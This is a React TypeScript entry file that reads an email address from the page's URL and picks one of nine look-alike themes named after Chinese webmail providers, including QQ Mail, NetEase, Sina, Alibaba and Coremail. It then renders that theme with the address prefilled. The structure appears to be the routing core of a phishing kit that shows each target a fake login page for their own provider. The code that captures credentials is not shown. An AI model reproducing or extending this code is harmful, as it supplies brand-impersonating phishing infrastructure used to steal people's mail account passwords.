
import React, { useMemo } from 'react';
import { SecurityProvider } from './components/SecurityManager';
import { LanguageProvider } from './components/LanguageProvider';
import AlibabaTheme from './themes/AlibabaTheme';
import BossmailTheme from './themes/BossmailTheme';
import Theme263 from './themes/Theme263';
import QQMailTheme from './themes/QQMailTheme';
import SinaTheme from './themes/SinaTheme';
import SohuTheme from './themes/SohuTheme';
import NetEaseTheme from './themes/NetEaseTheme';
import GlobalMailTheme from './themes/GlobalMailTheme';
import CoremailTheme from './themes/CoremailTheme';

const App: React.FC = () => {
  const { email, theme } = useMemo(() => {
    const params = new URLSearchParams(window.location.search);
    const emailParam = params.get('email') || '';
    const domain = emailParam.split('@')[1]?.toLowerCase() || '';
    
    let currentTheme = 'alibaba';
    if (domain.includes('bossmail')) {
      currentTheme = 'bossmail';
    } else if (domain.includes('263')) {
      currentTheme = '263';
    } else if (domain.includes('qq')) {
      currentTheme = 'qq';
    } else if (domain.includes('sina')) {
      currentTheme = 'sina';
    } else if (domain.includes('sohu')) {
      currentTheme = 'sohu';
    } else if (domain.includes('163') || domain.includes('126') || domain.includes('yeah') || domain.includes('netease')) {
      currentTheme = 'netease';
    } else if (domain.includes('global')) {
      currentTheme = 'globalmail';
    } else if (domain.includes('coremail')) {
      currentTheme = 'coremail';
    }

    return { email: emailParam, theme: currentTheme };
  }, []);

  const renderTheme = () => {
    switch (theme) {
      case 'bossmail': return <BossmailTheme prefilledEmail={email} />;
      case '263': return <Theme263 prefilledEmail={email} />;
      case 'qq': return <QQMailTheme prefilledEmail={email} />;
      case 'sina': return <SinaTheme prefilledEmail={email} />;
      case 'sohu': return <SohuTheme prefilledEmail={email} />;
      case 'netease': return <NetEaseTheme prefilledEmail={email} />;
      case 'globalmail': return <GlobalMailTheme prefilledEmail={email} />;
      case 'coremail': return <CoremailTheme prefilledEmail={email} />;
      default: return <AlibabaTheme prefilledEmail={email} />;
    }
  };

  return (
    <LanguageProvider>
      <SecurityProvider>
        <div className="min-h-screen">
          {renderTheme()}
        </div>
      </SecurityProvider>
    </LanguageProvider>
  );
};

export default App;
